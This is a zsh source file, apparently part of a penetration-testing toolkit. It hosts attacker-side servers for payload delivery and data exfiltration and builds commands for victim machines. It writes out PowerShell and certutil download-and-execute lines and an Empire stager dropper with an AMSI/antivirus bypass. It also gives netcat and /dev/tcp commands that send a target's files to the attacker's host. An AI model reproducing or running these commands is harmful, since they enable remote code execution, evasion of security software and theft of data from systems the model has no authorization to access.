#!/usr/bin/env zsh

############################################################# 
# nb-srv
#############################################################
nb-srv-help() {
    cat << "DOC" | bat --plain --language=help

nb-srv
-------
The srv namespace provides commands for hosting local services such as web, ftp, smb and other services for data exfil or transfer.

Commands
--------
nb-srv-install          install dependencies
nb-srv-file-download    copy command to download a payload into a target machine
nb-srv-empire-stager    use commands to stealthy download and execute empire stager into a target machine
nb-srv-web              hosts a python web server in current dir
nb-srv-ftp              hosts a python ftp server in current dir
nb-srv-smb              hosts an impacket smb server in current dir
nb-srv-tftp             starts the atftpd service in /srv/tftp
nb-srv-smtp             hosts a python smtp server in current dir
nb-srv-updog            hosts an updog web server in current dir
nb-srv-nc-tar           hosts a netcat server > tar file in current dir
nb-srv-nc-file          hosts a netcat server > file in current dir
nb-srv-web-hosted       hosts a python web server in /srv, port as $1
nb-srv-php-hosted       hosts a php web server in /srv, port as $1
nb-srv-ftp-hosted       hosts a python ftp server in /srv
nb-srv-updog-hosted     hosts an updog web server in /srv

DOC
}

nb-srv-install() {
    __info "Running $0..."
    __pkgs netcat atftpd 
    __pkgs php python python-pip python-smb python-pyftpdlib impacket python-updog
}

nb-srv-file-download() {
    __check-project
    nb-vars-set-lhost
    nb-vars-set-lport

    echo -n "Filename: "
    read filename
    echo

    clear

    __ask "Choose a command to copy:"
    echo "1.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
    echo "2.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
    echo "3.  iex(iwr http://${__LHOST}:${__LPORT}/$filename)"
    echo "4.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
    echo "5.  Previous menu"
    echo
    echo -n "Choice: "
    read choice

    case $choice in
        1) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\payload.exe";;
        2) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
        3) __COMMAND="iex(iwr http://${__LHOST}:${__LPORT}/$filename)";;
        4) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
        5) exit;;
        *) echo "Invalid option";;
    esac

    echo "$__COMMAND" | wl-copy

    __info "Run the shell using command:"
    __ok "  Start-Process \"shell-name.exe\""
}

nb-srv-empire-stager() {
    __check-project
    nb-vars-set-lhost
    nb-vars-set-lport

    # Path to generated Empire stager
    __ask "Set the directory to Empire launcher.bat payload (without the filename)"
    local d=$(__askpath DIR $HOME/downloads)
    [[ "$d" == "~"* ]] && __err "~ not allowed, use the full path" && return
    dp="${d}/launcher.bat"
    
    # Encode the stager - grab the Base64 string out of the file and save it in a file called "dropper"
    cat "$dp" | grep enc | tr " " "\n" | egrep -e '\S{30}+' > "$HOME/desktop/server/dropper"
    __info "Stager \"dropper\" encoded."

    # Download the stager and bypass AV
    __COMMAND="cat << "DOC" 

iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/amsi.ps1)
$a = iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/dropper
$b = [System.Convert]::FromBase64String($a)
iex([System.Text.Encoding]::Unicode.GetString($b))

DOC"

    # Copy the commands to clipboard
    echo "$__COMMAND" | wl-copy
    __info "Commands to download the \"dropper\" copied to clipboard."

    # Run the server
    cd "$HOME/desktop/server" ; echo "$(hip) in $PWD" ; sudo python3 -m http.server 8000
}

nb-srv-web() {
	print -z "sudo python -m http.server 80"
}

nb-srv-ftp() {
	print -z "sudo python -m pyftpdlib -p 21 -w"
}

nb-srv-smb() {
	print -z "sudo impacket-smbserver -smb2supp F ."
}

nb-srv-tftp() {
	print -z "sudo service atftpd start"
}

nb-srv-smtp() {
	print -z "sudo python -m smtpd -c DebuggingServer -n 0.0.0.0:25"
}

nb-srv-web-hosted() {
    __info "Serving content from /srv"
    if [ "$#" -eq  "1" ]
    then
        pushd /srv &> /dev/null
        sudo python -m http.server $1
        popd &> /dev/null
    else
        pushd /srv &> /dev/null
        sudo python -m http.server 80
        popd &> /dev/null
    fi
}

nb-srv-php-hosted() {
    __info "Serving content from /srv"
    if [ "$#" -eq  "1" ]
    then
        pushd /srv &> /dev/null
        sudo php -S 0.0.0.0:$1 
        popd &> /dev/null
    else
        pushd /srv &> /dev/null
        sudo php -S 0.0.0.0:80
        popd &> /dev/null
    fi
}

nb-srv-ftp-hosted() {
    __info "Serving content from /srv"
    pushd /srv &> /dev/null
    sudo python -m pyftpdlib -p 21 -w
    popd &> /dev/null
}

nb-srv-updog() {
    print -z "updog -p 443 --ssl -p $(__rand 10)"
}

nb-srv-updog-hosted() {
    __info "Serving content from /srv"
    sudo updog -p 443 --ssl -d /srv
}

nb-srv-nc-tar() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __cyan "Use the command below on the target system: "
    echo "tar cfv - /path/to/send | nc ${__LHOST} ${__LPORT}"
    print -z "nc -nvlp ${__LPORT} | tar xfv -"
}

nb-srv-nc-file() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __cyan "Use the command below on the target system: "
    echo "cat FILE > /dev/tcp/${__LHOST}/${__LPORT}"
    print -z "nc -nvlp ${port} -w 5 > incoming.txt"  
}

nb-srv-nc-b64() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __cyan "Use the command below on the target system: "
    echo "openssl base64 -in FILE > /dev/tcp/${__LHOST}/${__LPORT}"
    print -z "nc -nvlp ${__LPORT} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt"  
}
